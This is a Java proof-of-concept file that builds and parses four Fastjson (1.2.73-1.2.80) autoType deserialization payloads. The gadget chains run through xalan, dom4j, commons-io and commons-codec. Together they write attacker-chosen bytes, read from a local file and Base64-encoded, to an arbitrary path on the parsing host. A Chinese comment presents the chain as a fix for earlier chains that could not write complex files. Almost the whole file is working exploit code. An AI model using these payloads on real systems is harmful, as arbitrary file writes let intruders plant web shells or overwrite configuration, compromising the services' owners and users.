package test;
import java.io.InputStream;
import java.net.URL;
import java.util.Arrays;
import java.util.Base64;

import com.alibaba.fastjson.JSON;


public class Fastjson31_xalan_dom4j_io_write_4 {
    public static void main(String[] args) throws Exception {
    	String url = "file:///D:/Downloads/1.txt";
    	InputStream input = new URL(url).openStream();
    	byte[] bs = new byte[input.available()];
    	input.read(bs);
    	String test = Base64.getEncoder().encodeToString(bs);
    	byte[] testbs = test.getBytes();
    	
    	//1.2.73-1.2.80 xalan-2.7.2 dom4j-2.1.3 commons-io-2.2 aspectjtools-1.9.6 commons-codec-1.6
    	//这条链主要是为了解决1-3的io链无法写入复杂文件结构，文件依旧需要大于8kb才能写入
        String poc1 = "{\r\n"
        		+ "		\"@type\": \"java.lang.Exception\",\r\n"
        		+ "		\"@type\": \"org.apache.xml.dtm.DTMConfigurationException\",\"locator\":{}\r\n"
        		+ "}";
        String poc2 = "{\r\n"
        		+ "		\"@type\": \"java.lang.Class\",\r\n"
        		+ "		\"val\": {\r\n"
        		+ "			\"@type\": \"java.lang.String\" {\r\n"
        		+ "				\"@type\": \"java.util.Locale\",\r\n"
        		+ "				\"val\": {\r\n"
        		+ "					\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
        		+ "					{\r\n"
        		+ "						\"@type\": \"java.lang.String\"\r\n"
        		+ "						\"@type\": \"org.apache.xml.dtm.DTMConfigurationException\",\r\n"
        		+ "						\"locator\": {}\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}";
        String poc3 = "{\r\n"
        		+ "	\"su14\": {\r\n"
        		+ "		\"@type\": \"javax.xml.transform.SourceLocator\",\r\n"
        		+ "		\"@type\": \"org.apache.xpath.objects.XNodeSetForDOM\",\r\n"
        		+ "		\"nodeIter\": {\r\n"
        		+ "			\"@type\": \"org.apache.xpath.NodeSet\"\r\n"
        		+ "		},\r\n"
        		+ "		\"xctxt\": {\r\n"
        		+ "			\"@type\": \"org.apache.xpath.XPathContext\",\r\n"
        		+ "			\"primaryReader\": {\r\n"
        		+ "				\"@type\": \"org.dom4j.io.XMLWriter\",\r\n"
        		+ "				\"entityResolver\": {\r\n"
        		+ "					\"@type\": \"org.dom4j.io.SAXContentHandler\",\r\n"
        		+ "					\"inputSource\": {\r\n"
        		+ "						\"byteStream\": {\r\n"
        		+ "							\"@type\": \"java.io.InputStream\"\r\n"
        		+ "						}\r\n"
        		+ "					}\r\n"
        		+ "				}\r\n"
        		+ "			}\r\n"
        		+ "		}\r\n"
        		+ "	}\r\n"
        		+ "}";
        
        String poc4 = "{\r\n"
        		+ "		\"su16\": {\r\n"
        		+ "    \"@type\": \"java.io.InputStream\",\r\n"
        		+ "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\r\n"
        		+ "  \"delegate\":{\r\n"
        		+ "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\r\n"
        		+ "    \"input\":{\r\n"
        		+ "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\r\n"
        		+ "      \"in\":{\r\n"
        		+ "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\r\n"
        		+ "        \"charset\":\"utf-8\",\r\n"
        		+ "        \"bufferSize\": 1024,\r\n"
    			+ "        \"s\":{\"@type\":\"java.lang.String\"\""+test+"\"\r\n"
        		+ "      },\r\n"
        		+ "      \"doEncode\":false,\r\n"
        		+ "      \"lineLength\":1024,\r\n"
        		+ "      \"lineSeparator\":\"5ZWKCg==\",\r\n"
        		+ "      \"decodingPolicy\":0\r\n"
        		+ "    },\r\n"
        		+ "    \"branch\":{\r\n"
        		+ "      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\r\n"
        		+ "      \"targetPath\":\"1.txt\"\r\n"
        		+ "    },\r\n"
        		+ "    \"closeBranch\":true\r\n"
        		+ "  },\r\n"
        		+ "  \"include\":true,\r\n"
        		+ "  \"boms\":[{\r\n"
        		+ "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
        		+ "                  \"charsetName\": \"UTF-8\",\r\n"
    			+ "                  \"bytes\":"+Arrays.toString(testbs)+"\r\n"
        		+ "                }],\r\n"
        		+ "},\r\n"
        		+ "		\"su17\": {\r\n"
        		+ "			\"$ref\": \"$.su16.bOM.bytes\"\r\n"
        		+ "		}\r\n"
        		+ "	}";
        
        System.out.println(poc1);
        System.out.println(poc2);
        System.out.println(poc3);
        System.out.println(poc4);
        try {
        	JSON.parseObject(poc1);
		} catch (Exception e) {
		}
        JSON.parseObject(poc2);
        JSON.parseObject(poc3);
        JSON.parseObject(poc4);
        
    }
}
